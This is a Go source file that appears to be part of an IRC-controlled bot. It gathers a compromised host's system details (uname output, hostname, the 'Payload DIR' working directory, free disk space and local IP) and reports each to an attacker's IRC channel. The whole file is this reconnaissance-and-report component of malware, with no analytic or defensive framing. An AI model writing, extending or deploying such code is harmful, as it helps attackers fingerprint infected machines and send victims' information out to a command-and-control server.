package tools

import (
	"fmt"
	"net"
	"os"
	"os/exec"

	"golang.org/x/sys/unix"
)

func freeDiskSpace(hw string) uint64 {
	var stat unix.Statfs_t
	unix.Statfs(hw, &stat)
	return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024 //B to GB Formula
}

func getLocalIP() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:22")
	if err != nil {
		return "", err
	}
	defer conn.Close()

	ip := conn.LocalAddr().String()
	return ip, nil
}

func sysInfo() string {
	cmd, _ := exec.Command("uname", "-a").Output()
	return string(cmd)
}

func ReportInf(reportIRC net.Conn, set_chan string) {
	hName, _ := os.Hostname()
	pDir, _ := os.Getwd()

	hw := &pDir
	sFds := fmt.Sprint(freeDiskSpace(*hw))
	sGlp := fmt.Sprint(getLocalIP())

	IRC_Report(reportIRC, set_chan, "System Info: "+sysInfo())
	IRC_Report(reportIRC, set_chan, "Host Name: "+hName)
	IRC_Report(reportIRC, set_chan, "Payload DIR: "+pDir)
	IRC_Report(reportIRC, set_chan, "Free Disk Space (GB): "+sFds)
	IRC_Report(reportIRC, set_chan, "Local IP: "+sGlp)
}
